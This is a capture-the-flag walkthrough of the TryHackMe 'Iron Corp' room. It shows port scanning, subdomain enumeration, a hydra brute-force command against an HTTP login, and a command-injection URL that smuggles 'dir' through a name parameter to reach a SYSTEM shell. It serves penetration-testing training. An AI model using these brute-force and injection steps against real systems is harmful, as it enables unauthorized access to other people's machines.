---
title: TryHackMe Iron Corp
Categories: [TryHackMe]
tags: [windows, bruteforce, rce]
media_subpath: /images/tryhackme_ironcorp
image:
  path: room-image.jpeg
---

https://tryhackme.com/room/ironcorp

Add `ironcorp.me` to /etc/hosts

![etc-hosts](etc-hosts.png)

## Initial Scan

```console
$ nmap -Pn -sS -sC -sV -T4 -p- ironcorp.me
Nmap scan report for ironcorp.me (10.10.98.85)
Host is up (0.040s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Not valid before: 2025-08-07T11:30:25
|_Not valid after:  2026-02-06T11:30:25
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2025-08-08T11:39:02+00:00
|_ssl-date: 2025-08-08T11:39:10+00:00; -1s from scanner time.
8080/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
| http-methods: 
|_  Potentially risky methods: TRACE
11025/tcp open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
|_http-title: Coming Soon - Start Bootstrap Theme
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration 

On main domain there weren't something useful, gouster found 2 subdomains, add `admin.ironcorp.me` and `internal.ironcorp.me` to /etc/hosts

![gobuster1](gobuster1.png)


403 Status code on internal subdomain, but if we try accessing this port with `admin` subdomain...

![internal-11025](internal-11025.png)


![admin-login](admin-login.png)


Let's bruteforce using hydra

```console
hydra -l admin -P /usr/share/wordlists/rockyou.txt admin.ironcorp.me http-get -s 11025
```

Log in using bruted password


## Initial Entry

This searchbar doesnt work with commands/finding files with just words but works if you give it url

![searchbar](searchbar.png)

Here's example what it does

![searchbar-nmap](searchbar-nmap.png)


We couldn't access `internal.ironcorp.me:11025`, we could try doing it here, there were text `You can find your name here`, copy link and paste to searchbar:

![name-php](name-php.png)


After few attempts to inject commands it is possible to run them using `|` symbol

`http://internal.ironcorp.me:11025/name.php?name=qwe|dir`

![rce](rce.png)


Now what left is catching a shell

![revshell](revshell.png)


And we already nt authority\system!

### user.txt


```console
PS C:\Users> type C:\Users\Administrator\Desktop\user.txt
thm{09[REDACTED]8c}
```

## Privilege Escalation

Here's actually nothing to do for escalation as we already admin, but to get root.txt we need access `SuperAdmin` directory

![users-dir](users-dir.png)
 

### root.txt

We don't have access to this directory, however if you try reading directly by this path you get root flag

```console
PS C:\> type C:\Users\SuperAdmin\Desktop\root.txt
thm{a1[REDACTED]bd}
```
